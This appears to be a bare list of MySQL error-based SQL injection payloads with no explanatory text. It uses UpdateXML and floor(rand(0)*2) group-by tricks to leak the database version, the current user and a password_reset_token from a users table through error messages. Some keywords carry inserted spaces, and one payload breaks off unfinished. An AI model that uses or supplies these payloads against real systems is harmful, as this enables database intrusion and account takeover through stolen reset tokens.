element.payload: and UpdateXML(1,CONCAT(0x5b,mid((SELECT passw ord_reset_token from gpk_main.users where id=1),1,32),0x5d),1)
-(case when(1=2) then dateline else membernum end)

' and (select 1 from(select count(*),concat(0x7c,(select (Select version()) from inf ormation_schema.tables limit 0,1),0x7c,flo or(r and(0)*2))x from inf ormation_schema.tables group by x limit 0,1)a)%23/wapc/5000_0005_003
' and (select 1 from(select count(*),concat(0x7c,(select (Select version()) from inf ormation_schema.tables limit 0,1),0
(select 1 from (select count(*), concat(flo or(r and(0)*2), 0x5e5e5e,user()) x from inf ormation_schema.character_sets group by x)y)
